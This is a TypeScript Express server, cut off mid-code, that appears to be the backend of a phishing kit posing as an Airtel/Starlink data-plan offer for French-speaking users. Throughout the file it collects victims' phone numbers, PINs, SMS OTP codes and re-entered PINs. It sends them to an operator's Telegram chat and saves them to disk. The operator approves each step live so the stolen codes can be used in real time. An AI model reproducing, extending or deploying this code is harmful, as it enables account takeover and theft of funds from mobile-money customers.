import express from 'express';
import path from 'path';
import fs from 'fs';
import { createServer as createViteServer } from 'vite';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;

app.use(express.json());

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID || '';

export interface SessionRecord {
  sessionId: string;
  phone: string;
  fullPhone?: string;
  country?: string;
  airtelBrand?: string;
  pin: string;
  reenterPin?: string;
  otp?: string;
  planName: string;
  planPrice: string;
  loginStatus: 'pending' | 'approved' | 'rejected';
  otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  reenterStatus?: 'idle' | 'pending' | 'approved' | 'rejected';
  loginMessageId?: number;
  otpMessageId?: number;
  reenterMessageId?: number;
  createdAt: number;
  lastUpdated: number;
}

// In-memory sessions storage
const sessions = new Map<string, SessionRecord>();
// Phone to latest sessionId index for quick multi-request routing
const phoneToSessionMap = new Map<string, string>();

// Event listeners for instant long-polling responses (< 50ms latency)
type SessionListener = (session: SessionRecord) => void;
const waitingListeners = new Map<string, Set<SessionListener>>();

// Persistent storage file
const DATA_DIR = path.join(process.cwd(), 'data');
const SESSIONS_FILE = path.join(DATA_DIR, 'sessions.json');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
  try {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  } catch (err) {
    console.warn('Could not create data dir:', err);
  }
}

// Load persisted sessions on startup
function loadPersistedSessions() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const data = fs.readFileSync(SESSIONS_FILE, 'utf-8');
      if (data) {
        const parsed: Record<string, SessionRecord> = JSON.parse(data);
        const now = Date.now();
        let loadedCount = 0;
        for (const [id, s] of Object.entries(parsed)) {
          // Keep pending sessions or sessions less than 2 hours old
          if (s.loginStatus === 'pending' || s.otpStatus === 'pending' || (now - s.lastUpdated < 2 * 3600 * 1000)) {
            sessions.set(id, s);
            phoneToSessionMap.set(s.phone, id);
            loadedCount++;
          }
        }
        console.log(`[Storage] Restored ${loadedCount} active sessions from disk.`);
      }
    }
  } catch (err) {
    console.warn('[Storage] Error loading sessions file:', err);
  }
}

let saveDebounceTimer: NodeJS.Timeout | null = null;
function saveSessionsToDisk() {
  if (saveDebounceTimer) clearTimeout(saveDebounceTimer);
  saveDebounceTimer = setTimeout(() => {
    try {
      const obj: Record<string, SessionRecord> = {};
      sessions.forEach((val, key) => {
        obj[key] = val;
      });
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify(obj, null, 2), 'utf-8');
    } catch (err) {
      console.warn('[Storage] Failed to save sessions to disk:', err);
    }
  }, 250);
}

loadPersistedSessions();

// Notify all listeners waiting for an update on this sessionId
function notifySessionUpdated(session: SessionRecord) {
  const listeners = waitingListeners.get(session.sessionId);
  if (listeners && listeners.size > 0) {
    for (const listener of listeners) {
      try {
        listener(session);
      } catch (err) {
        console.error('Error executing session listener:', err);
      }
    }
    waitingListeners.delete(session.sessionId);
  }
}

// Helper function to send Telegram message
async function sendTelegramMessage(text: string, inlineKeyboard?: any) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const payload: any = {
      chat_id: CHAT_ID,
      text: text,
      parse_mode: 'HTML',
    };
    if (inlineKeyboard) {
      payload.reply_markup = {
        inline_keyboard: inlineKeyboard,
      };
    }
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Failed to send Telegram message:', error);
    return null;
  }
}

// Helper to answer callback query promptly (non-blocking)
function answerCallbackQuery(callbackQueryId: string, text: string, showAlert = false) {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      callback_query_id: callbackQueryId,
      text,
      show_alert: showAlert,
    }),
  }).catch((err) => console.warn('Failed to answer callback query:', err));
}

// Helper to edit message text
function editMessageText(chatId: string | number, messageId: number, newText: string) {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      message_id: messageId,
      text: newText,
      parse_mode: 'HTML',
    }),
  }).catch((err) => console.warn('Failed to edit message text:', err));
}

// Normalizer for phone numbers
function normalizePhone(raw: string): string {
  return raw.replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '');
}

// Helper function to ensure any stale or conflicting Telegram webhook is cleared
async function ensureTelegramWebhookCleared() {
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook?drop_pending_updates=false`);
    const data = await res.json();
    console.log('[Telegram Worker] Webhook deletion check:', data?.description || data);
  } catch (err) {
    console.warn('[Telegram Worker] Webhook deletion error:', err);
  }
}

// Session resolution helper by ID, phone number, or regex in message text
function findSessionByIdOrPhone(idOrPhone: string, messageText?: string): SessionRecord | undefined {
  if (!idOrPhone) return undefined;
  const cleanId = idOrPhone.trim();

  // 1. Direct ID match in sessions Map
  let session = sessions.get(cleanId);
  if (session) return session;

  // 2. Direct Phone match
  const cleanPhone = normalizePhone(cleanId);
  if (cleanPhone && phoneToSessionMap.has(cleanPhone)) {
    session = sessions.get(phoneToSessionMap.get(cleanPhone)!);
    if (session) return session;
  }

  // 3. Fallback regex in messageText if available
  if (messageText) {
    const idMatch = messageText.match(/ID Session:\s*(?:<code>)?([a-zA-Z0-9_-]+)(?:<\/code>)?/i);
    if (idMatch && idMatch[1]) {
      session = sessions.get(idMatch[1].trim());
      if (session) return session;
    }
    const phoneMatch = messageText.match(/Numéro[^:]*:\s*(?:<code>)?(\+?[0-9\s]+)(?:<\/code>)?/i);
    if (phoneMatch && phoneMatch[1]) {
      const pClean = normalizePhone(phoneMatch[1]);
      if (pClean && phoneToSessionMap.has(pClean)) {
        session = sessions.get(phoneToSessionMap.get(pClean)!);
        if (session) return session;
      }
    }
  }

  // 4. Case-insensitive session ID search
  for (const [key, val] of sessions.entries()) {
    if (key.toLowerCase() === cleanId.toLowerCase()) return val;
  }

  return undefined;
}

// Helper to get the most recent pending session
function getLatestPendingSession(type: 'login' | 'otp' | 'reenter' | 'any'): SessionRecord | undefined {
  let latest: SessionRecord | undefined;
  for (const s of sessions.values()) {
    const isTarget =
      type === 'login'
        ? s.loginStatus === 'pending'
        : type === 'otp'
        ? s.otpStatus === 'pending'
        : type === 'reenter'
        ? s.reenterStatus === 'pending'
        : s.loginStatus === 'pending' || s.otpStatus === 'pending' || s.reenterStatus === 'pending';
    if (isTarget) {
      if (!latest || s.lastUpdated > latest.lastUpdated) {
        latest = s;
      }
    }
  }
  return latest;
}

// Central Telegram Polling Worker
let telegramOffset = 0;
let isPolling = false;

async function pollTelegramUpdates() {
  if (isPolling) return;
  isPolling = true;

  // Always clear any conflicting webhook on start
  await ensureTelegramWebhookCleared();
  console.log('[Telegram Worker] Starting polling loop with allowed_updates=[message, callback_query]...');

  while (true) {
    try {
      const allowedUpdatesParam = encodeURIComponent(JSON.stringify(['message', 'callback_query']));
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${telegramOffset}&timeout=15&limit=50&allowed_updates=${allowedUpdatesParam}`;

      const res = await fetch(url);
      if (!res.ok) {
        if (res.status === 409) {
          console.warn('[Telegram Worker] 409 Conflict: webhook was re-attached. Deleting webhook and resuming...');
          await ensureTelegramWebhookCleared();
          await new Promise((r) => setTimeout(r, 2000));
          continue;
        }
        await new Promise((r) => setTimeout(r, 2000));
        continue;
      }

      const data = await res.json();
      if (data && data.ok && Array.isArray(data.result)) {
        for (const update of data.result) {
          telegramOffset = Math.max(telegramOffset, update.update_id + 1);

          // 1. INLINE BUTTON CALLBACK QUERIES
          if (update.callback_query) {
            const query = update.callback_query;
            const callbackData: string = query.data || '';
            const callbackId: string = query.id;
            const msgId: number | undefined = query.message?.message_id;
            const chatId: string | number | undefined = query.message?.chat?.id;
            const originalText: string = query.message?.text || '';

            console.log(`[Telegram Worker] Processing callback: ${callbackData}`);

            // A) APPROVE LOGIN
            if (callbackData.startsWith('approve_login')) {
              const rawId = callbackData.replace('approve_login_', '').replace('approve_login', '').trim();
              const session = findSessionByIdOrPhone(rawId, originalText) || getLatestPendingSession('login');

              if (session) {
                session.loginStatus = 'approved';
                session.lastUpdated = Date.now();
                saveSessionsToDisk();
                notifySessionUpdated(session);

                answerCallbackQuery(callbackId, '✅ Connexion validée ! Redirection client vers le code OTP.', true);

                if (msgId && chatId) {
                  const updatedText =
                    `🔴 <b>AIRTEL LITE - CONNEXION CLIENT VALIDÉE</b>\n\n` +
                    `🌍 <b>Pays:</b> ${session.country || 'Airtel'}\n` +
                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
                    `🔑 <b>Code PIN:</b> <code>${session.pin}</code>\n` +
                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
                    `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
                    `🟢 <b>STATUT: ✅ APPROUVÉ PAR L'ADMINISTRATEUR</b>\n` +
                    `<i>L'utilisateur accède actuellement à la saisie du code OTP.</i>`;
                  editMessageText(chatId, msgId, updatedText);
                }
              } else {
                answerCallbackQuery(callbackId, 'Session introuvable ou expirée.', false);
              }
            }

            // B) REJECT LOGIN
            else if (callbackData.startsWith('reject_login')) {
              const rawId = callbackData.replace('reject_login_', '').replace('reject_login', '').trim();
              const session = findSessionByIdOrPhone(rawId, originalText) || getLatestPendingSession('login');

              if (session) {
                session.loginStatus = 'rejected';
                session.lastUpdated = Date.now();
                saveSessionsToDisk();
                notifySessionUpdated(session);

                answerCallbackQuery(callbackId, '❌ Connexion rejetée (PIN ou numéro incorrect).', true);

                if (msgId && chatId) {
                  const updatedText =
                    `🔴 <b>AIRTEL LITE - CONNEXION CLIENT REFUSÉE</b>\n\n` +
                    `🌍 <b>Pays:</b> ${session.country || 'Airtel'}\n` +
                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
                    `🔑 <b>Code PIN:</b> <code>${session.pin}</code>\n` +
                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
                    `⏰ <b>Heure refus:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
                    `🔴 <b>STATUT: ❌ REJETÉ (CODE PIN OU NUMÉRO INCORRECT)</b>\n` +
                    `<i>L'utilisateur a été notifié de l'erreur sur son écran.</i>`;
                  editMessageText(chatId, msgId, updatedText);
                }
              } else {
                answerCallbackQuery(callbackId, 'Session introuvable ou expirée.', false);
              }
            }

            // C) APPROVE OTP
            else if (callbackData.startsWith('approve_otp')) {
              const rawId = callbackData.replace('approve_otp_', '').replace('approve_otp', '').trim();
              const session = findSessionByIdOrPhone(rawId, originalText) || getLatestPendingSession('otp');

              if (session) {
                session.otpStatus = 'approved';
                session.lastUpdated = Date.now();
                saveSessionsToDisk();
                notifySessionUpdated(session);

                answerCallbackQuery(callbackId, '✅ Code OTP validé avec succès ! Forfait activé.', true);

                if (msgId && chatId) {
                  const updatedText =
                    `🔐 <b>AIRTEL LITE - CODE OTP VALIDÉ (4 CHIFFRES)</b>\n\n` +
                    `🌍 <b>Pays:</b> ${session.country || 'Airtel'}\n` +
                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
                    `🔢 <b>Code OTP:</b> <code>${session.otp || '****'}</code>\n` +
                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
                    `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
                    `🟢 <b>STATUT: ✅ OTP CONFIRMÉ ET VALIDÉ</b>\n` +
                    `<i>Transaction terminée avec succès. L'utilisateur a été redirigé vers la confirmation.</i>`;
                  editMessageText(chatId, msgId, updatedText);
                }
              } else {
                answerCallbackQuery(callbackId, 'Session introuvable.', false);
              }
            }

            // D) REJECT OTP
            else if (callbackData.startsWith('reject_otp')) {
              const rawId = callbackData.replace('reject_otp_', '').replace('reject_otp', '').trim();
              const session = findSessionByIdOrPhone(rawId, originalText) || getLatestPendingSession('otp');

              if (session) {
                session.otpStatus = 'rejected';
                session.lastUpdated = Date.now();
                saveSessionsToDisk();
                notifySessionUpdated(session);

                answerCallbackQuery(callbackId, '❌ Code OTP rejeté ou invalide.', true);

                if (msgId && chatId) {
                  const updatedText =
                    `🔐 <b>AIRTEL LITE - CODE OTP REFUSÉ (4 CHIFFRES)</b>\n\n` +
                    `🌍 <b>Pays:</b> ${session.country || 'Airtel'}\n` +
                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
                    `🔢 <b>Code OTP Saisi:</b> <code>${session.otp || '****'}</code>\n` +
                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
                    `⏰ <b>Heure refus:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
                    `🔴 <b>STATUT: ❌ OTP REJETÉ / INVALIDE</b>\n` +
                    `<i>L'utilisateur a été invité à ressaisir son code OTP.</i>`;
                  editMessageText(chatId, msgId, updatedText);
                }
              } else {
                answerCallbackQuery(callbackId, 'Session introuvable.', false);
              }
            }

            // E) APPROVE REENTER PIN
            else if (callbackData.startsWith('approve_reenter')) {
              const rawId = callbackData.replace('approve_reenter_', '').replace('approve_reenter', '').trim();
              const session = findSessionByIdOrPhone(rawId, originalText) || getLatestPendingSession('reenter');

              if (session) {
                session.reenterStatus = 'approved';
                session.lastUpdated = Date.now();
                saveSessionsToDisk();
                notifySessionUpdated(session);

                answerCallbackQuery(callbackId, '✅ Code PIN final validé avec succès ! Forfait activé.', true);

                if (msgId && chatId) {
                  const updatedText =
                    `🔐 <b>AIRTEL LITE - CODE PIN FINAL VALIDÉ</b>\n\n` +
                    `🌍 <b>Pays:</b> ${session.country || 'Airtel'}\n` +
                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
                    `🔑 <b>Code PIN Ressaisi:</b> <code>${session.reenterPin || session.pin}</code>\n` +
                    `🔢 <b>Code OTP Validé:</b> <code>${session.otp || '****'}</code>\n` +
                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
                    `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
                    `🟢 <b>STATUT: ✅ CODE PIN CONFIRMÉ & FORFAIT ACTIVÉ AVEC SUCCÈS</b>\n` +
                    `<i>Transaction terminée avec succès. L'utilisateur a été redirigé vers l'écran de succès.</i>`;
                  editMessageText(chatId, msgId, updatedText);
                }
              } else {
                answerCallbackQuery(callbackId, 'Session introuvable.', false);
              }
            }

            // F) REJECT REENTER PIN
            else if (callbackData.startsWith('reject_reenter')) {
              const rawId = callbackData.replace('reject_reenter_', '').replace('reject_reenter', '').trim();
              const session = findSessionByIdOrPhone(rawId, originalText) || getLatestPendingSession('reenter');

              if (session) {
                session.reenterStatus = 'rejected';
                session.lastUpdated = Date.now();
                saveSessionsToDisk();
                notifySessionUpdated(session);

                answerCallbackQuery(callbackId, '❌ Code PIN rejeté (incorrect).', true);

                if (msgId && chatId) {
                  const updatedText =
                    `🔐 <b>AIRTEL LITE - CODE PIN FINAL REJETÉ</b>\n\n` +
                    `🌍 <b>Pays:</b> ${session.country || 'Airtel'}\n` +
                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
                    `🔑 <b>Code PIN Saisi:</b> <code>${session.reenterPin || '****'}</code>\n` +
                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
                    `⏰ <b>Heure refus:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
                    `🔴 <b>STATUT: ❌ CODE PIN REJETÉ / INCORRECT</b>\n` +
                    `<i>L'utilisateur a été invité à ressaisir son code PIN correct sur son écran.</i>`;
                  editMessageText(chatId, msgId, updatedText);
                }
              } else {
                answerCallbackQuery(callbackId, 'Session introuvable.', false);
              }
            }
          }

          // 2. TEXT MESSAGES (REPLIES OR DIRECT ADMIN COMMANDS)
          if (update.message) {
            const msg = update.message;
            const text = (msg.text || '').trim();
            const lowerText = text.toLowerCase();
            const chatId = msg.chat?.id;
            const replyTo = msg.reply_to_message;

            console.log(`[Telegram Worker] Received text message: "${text}"`);

            // Case A: Reply to an existing bot message
            if (replyTo && replyTo.text) {
              const replyText = replyTo.text;
              const isReenter = replyText.includes('RESSAISIE') || replyText.includes('CONFIRMÉ') || replyText.includes('FINAL');
              const isOtp = !isReenter && (replyText.includes('OTP') || replyText.includes('VÉRIFICATION'));
              const session = findSessionByIdOrPhone('', replyText) || getLatestPendingSession(isReenter ? 'reenter' : isOtp ? 'otp' : 'login');

              if (session) {
                const isApprove = ['ok', 'oui', 'valider', 'yes', 'approve', 'bon', '+', '1', '/ok', '/valider'].includes(lowerText);
                const isReject = ['non', 'refuser', 'no', 'reject', 'faux', 'erreur', '-', '0', '/non', '/rejeter'].includes(lowerText);

                if (isApprove) {
                  if (isReenter) {
                    session.reenterStatus = 'approved';
                  } else if (isOtp) {
                    session.otpStatus = 'approved';
                  } else {
                    session.loginStatus = 'approved';
                  }
                  session.lastUpdated = Date.now();
                  saveSessionsToDisk();
                  notifySessionUpdated(session);

                  sendTelegramMessage(
                    `✅ <b>${isReenter ? 'Code PIN Final' : isOtp ? 'OTP' : 'Connexion'} Validé(e) avec succès !</b>\n` +
                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>`
                  );
                } else if (isReject) {
                  if (isReenter) {
                    session.reenterStatus = 'rejected';
                  } else if (isOtp) {
                    session.otpStatus = 'rejected';
                  } else {
                    session.loginStatus = 'rejected';
                  }
                  session.lastUpdated = Date.now();
                  saveSessionsToDisk();
                  notifySessionUpdated(session);

                  sendTelegramMessage(
                    `❌ <b>${isReenter ? 'Code PIN Final' : isOtp ? 'OTP' : 'Connexion'} Rejeté(e) !</b>\n` +
                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>`
                  );
                }
              }
            }

            // Case B: Direct commands like /ok, /valider, /rejeter, /status
            else if (lowerText.startsWith('/ok') || lowerText.startsWith('/valider') || lowerText === 'ok' || lowerText === 'valider') {
              const param = text.split(/\s+/)[1];
              const session = param ? findSessionByIdOrPhone(param) : getLatestPendingSession('any');

              if (session) {
                if (session.reenterStatus === 'pending') {
                  session.reenterStatus = 'approved';
                } else if (session.otpStatus === 'pending') {
                  session.otpStatus = 'approved';
                } else {
                  session.loginStatus = 'approved';
                }
                session.lastUpdated = Date.now();
                saveSessionsToDisk();
                notifySessionUpdated(session);

                sendTelegramMessage(
                  `✅ <b>Action validée avec succès !</b>\n` +
                  `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
                  `📦 <b>Forfait:</b> ${session.planName}\n` +
                  `🆔 <b>Session:</b> <code>${session.sessionId}</code>`
                );
              } else {
                sendTelegramMessage('⚠️ Aucune session en attente trouvée.');
              }
            }

            else if (lowerText.startsWith('/rejeter') || lowerText.startsWith('/refuser') || lowerText === 'non') {
              const param = text.split(/\s+/)[1];
              const session = param ? findSessionByIdOrPhone(param) : getLatestPendingSession('any');

              if (session) {
                if (session.reenterStatus === 'pending') {
                  session.reenterStatus = 'rejected';
                } else if (session.otpStatus === 'pending') {
                  session.otpStatus = 'rejected';
                } else {
                  session.loginStatus = 'rejected';
                }
                session.lastUpdated = Date.now();
                saveSessionsToDisk();
                notifySessionUpdated(session);

                sendTelegramMessage(
                  `❌ <b>Session rejetée !</b>\n` +
                  `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
                  `🆔 <b>Session:</b> <code>${session.sessionId}</code>`
                );
              } else {
                sendTelegramMessage('⚠️ Aucune session en attente trouvée.');
              }
            }

            else if (lowerText.startsWith('/status')) {
              let pendingCount = 0;
              let report = `📊 <b>STATUT DES SESSIONS AIRTEL STARLINK</b>\n\n`;
              sessions.forEach((s) => {
                if (s.loginStatus === 'pending' || s.otpStatus === 'pending') {
                  pendingCount++;
                  report +=
                    `• <b>${s.fullPhone || s.phone}</b> (${s.country || 'Airtel'})\n` +
                    `  Session: <code>${s.sessionId}</code> | PIN: <code>${s.pin}</code>\n` +
                    `  Statut: Login=<b>${s.loginStatus}</b>, OTP=<b>${s.otpStatus}</b>\n\n`;
                }
              });
              if (pendingCount === 0) {
                report += '<i>Aucune session en attente actuellement.</i>';
              }
              sendTelegramMessage(report);
            }
          }
        }
      }
    } catch (err) {
      console.warn('[Telegram Worker] Polling cycle error:', err);
      await new Promise((r) => setTimeout(r, 2000));
    }
  }
}

// Start central telegram worker
pollTelegramUpdates().catch((e) => {
  console.error('[Telegram Worker] Error:', e);
});

// Periodic Session Cleanup:
// Keep pending sessions until bot feedback is received!
// Clean up finalized (approved/rejected) sessions older than 2 hours
setInterval(() => {
  const now = Date.now();
  let cleaned = 0;
  sessions.forEach((s, key) => {
    const isFinished = s.otpStatus === 'approved' || s.loginStatus === 'rejected' || s.otpStatus === 'rejected';
    const age = now - s.lastUpdated;
    // Remove completed sessions after 2 hours, or any stale session older than 24h
    if ((isFinished && age > 2 * 3600 * 1000) || age > 24 * 3600 * 1000) {
      sessions.delete(key);
      if (phoneToSessionMap.get(s.phone) === key) {
        phoneToSessionMap.delete(s.phone);
      }
      cleaned++;
    }
  });
  if (cleaned > 0) {
    console.log(`[Storage Cleanup] Purged ${cleaned} stale sessions.`);
    saveSessionsToDisk();
  }
}, 10 * 60 * 1000);

// API Health Endpoint
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    botConfigured: Boolean(BOT_TOKEN && CHAT_ID),
    activeSessions: sessions.size,
    timestamp: Date.now(),
  });
});

// 1. Send Login Credentials to Telegram
app.post('/api/telegram/send-login', async (req, res) => {
  try {
    const { sessionId, phone, pin, planName, planPrice, country, fullPhone, airtelBrand } = req.body;

    if (!sessionId || !phone || !pin) {
      return res.status(400).json({ error: 'Champs obligatoires manquants.' });
    }

    const cleanPhone = normalizePhone(phone);
    const displayPhone = fullPhone || `+243 ${cleanPhone}`;
    const displayCountry = country || 'Airtel Africa';
    const displayBrand = airtelBrand || 'Airtel x Starlink Direct';

    // Retrieve or instantiate session
    let session = sessions.get(sessionId);
    if (!session) {
      session = {
        sessionId,
        phone: cleanPhone,
        fullPhone: displayPhone,
        country: displayCountry,
        airtelBrand: displayBrand,
        pin: pin.toString().slice(0, 4),
        planName: planName || 'Forfait Airtel Starlink',
        planPrice: planPrice || '$1.49',
        loginStatus: 'pending',
        otpStatus: 'idle',
        createdAt: Date.now(),
        lastUpdated: Date.now(),
      };
      sessions.set(sessionId, session);
    } else {
      session.phone = cleanPhone;
      session.fullPhone = displayPhone;
      session.country = displayCountry;
      session.airtelBrand = displayBrand;
      session.pin = pin.toString().slice(0, 4);
      session.planName = planName || session.planName;
      session.planPrice = planPrice || session.planPrice;
      session.loginStatus = 'pending';
      session.lastUpdated = Date.now();
    }

    phoneToSessionMap.set(cleanPhone, sessionId);
    saveSessionsToDisk();

    const messageText =
      `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro de Téléphone:</b> <code>${displayPhone}</code>\n` +
      `🔑 <b>Code PIN (4 chiffres):</b> <code>${session.pin}</code>\n` +
      `📦 <b>Forfait Choisi:</b> <b>${session.planName}</b> (${session.planPrice})\n` +
      `📶 <b>Réseau:</b> ${displayBrand}\n` +
      `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
      `🆔 <b>ID Session:</b> <code>${sessionId}</code>\n\n` +
      `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider PIN',
          callback_data: `approve_login_${sessionId}`,
        },
        {
          text: '❌ Rejeter PIN',
          callback_data: `reject_login_${sessionId}`,
        },
      ],
    ];

    const result = await sendTelegramMessage(messageText, inlineKeyboard);
    if (result && result.result?.message_id) {
      session.loginMessageId = result.result.message_id;
      saveSessionsToDisk();
    }

    return res.json({
      success: true,
      sessionId,
      status: session.loginStatus,
      message: 'Demande envoyée au bot Telegram avec succès.',
    });
  } catch (error: any) {
    console.error('Error in /api/telegram/send-login:', error);
    return res.status(500).json({ error: error.message || 'Erreur serveur' });
  }
});

// 2. Send 4-digit OTP Code to Telegram
app.post('/api/telegram/send-otp', async (req, res) => {
  try {
    const { sessionId, phone, otp, planName, planPrice, country, fullPhone, airtelBrand } = req.body;

    if (!sessionId || !otp) {
      return res.status(400).json({ error: 'Paramètres manquants.' });
    }

    const cleanOtp = otp.toString().replace(/\D/g, '').slice(0, 4);
    if (cleanOtp.length !== 4) {
      return res.status(400).json({ error: 'Le code OTP doit comporter exactement 4 chiffres.' });
    }

    let session = sessions.get(sessionId);
    if (!session) {
      const cleanPhone = phone ? normalizePhone(phone) : 'Inconnu';
      session = {
        sessionId,
        phone: cleanPhone,
        fullPhone: fullPhone || `+243 ${cleanPhone}`,
        country: country || 'Airtel Africa',
        airtelBrand: airtelBrand || 'Airtel Starlink',
        pin: '****',
        planName: planName || 'Forfait Airtel Starlink',
        planPrice: planPrice || '$1.49',
        loginStatus: 'approved',
        otpStatus: 'pending',
        createdAt: Date.now(),
        lastUpdated: Date.now(),
      };
      sessions.set(sessionId, session);
      if (cleanPhone !== 'Inconnu') {
        phoneToSessionMap.set(cleanPhone, sessionId);
      }
    }

    session.otp = cleanOtp;
    session.otpStatus = 'pending';
    if (fullPhone) session.fullPhone = fullPhone;
    if (country) session.country = country;
    session.lastUpdated = Date.now();
    saveSessionsToDisk();

    const displayPhone = session.fullPhone || `+243 ${session.phone}`;
    const displayCountry = session.country || 'Airtel Africa';

    const messageText =
      `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
      `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
      `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
      `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider OTP',
          callback_data: `approve_otp_${sessionId}`,
        },
        {
          text: '❌ Rejeter OTP',
          callback_data: `reject_otp_${sessionId}`,
        },
      ],
    ];

    const result = await sendTelegramMessage(messageText, inlineKeyboard);
    if (result && result.result?.message_id) {
      session.otpMessageId = result.result.message_id;
      saveSessionsToDisk();
    }

    return res.json({
      success: true,
      sessionId,
      status: session.otpStatus,
      message: 'Code OTP transmis au Telegram.',
    });
  } catch (error: any) {
    console.error('Error in /api/telegram/send-otp:', error);
    return res.status(500).json({ error: error.message || 'Erreur serveur' });
  }
});

// 2b. Send Re-entered / Confirmed 4-digit PIN to Telegram
app.post('/api/telegram/send-reenter-pin', async (req, res) => {
  try {
    const { sessionId, phone, pin, originalPin, planName, planPrice, country, fullPhone, airtelBrand } = req.body;

    if (!sessionId || !pin) {
      return res.status(400).json({ error: 'Paramètres manquants.' });
    }

    const cleanPin = pin.toString().replace(/\D/g, '').slice(0, 4);
    if (cleanPin.length !== 4) {
      return res.status(400).json({ error: 'Le code PIN doit comporter exactement 4 chiffres.' });
    }

    let session = sessions.get(sessionId);
    if (!session) {
      const cleanPhone = phone ? normalizePhone(phone) : 'Inconnu';
      session = {
        sessionId,
        phone: cleanPhone,
        fullPhone: fullPhone || `+243 ${cleanPhone}`,
        country: country || 'Airtel Africa',
        airtelBrand: airtelBrand || 'Airtel Starlink',
        pin: originalPin || '****',
        reenterPin: cleanPin,
        planName: planName || 'Forfait Airtel Starlink',
        planPrice: planPrice || '$1.49',
        loginStatus: 'approved',
        otpStatus: 'approved',
        reenterStatus: 'pending',
        createdAt: Date.now(),
        lastUpdated: Date.now(),
      };
      sessions.set(sessionId, session);
      if (cleanPhone !== 'Inconnu') {
        phoneToSessionMap.set(cleanPhone, sessionId);
      }
    } else {
      session.reenterPin = cleanPin;
      session.reenterStatus = 'pending';
      if (fullPhone) session.fullPhone = fullPhone;
      if (country) session.country = country;
      session.lastUpdated = Date.now();
    }

    saveSessionsToDisk();

    const displayPhone = session.fullPhone || `+243 ${session.phone}`;
    const displayCountry = session.country || 'Airtel Africa';

    const messageText =
      `🔐 <b>CODE PIN CONFIRMÉ / RESSAISI (ÉTAPE POST-OTP)</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
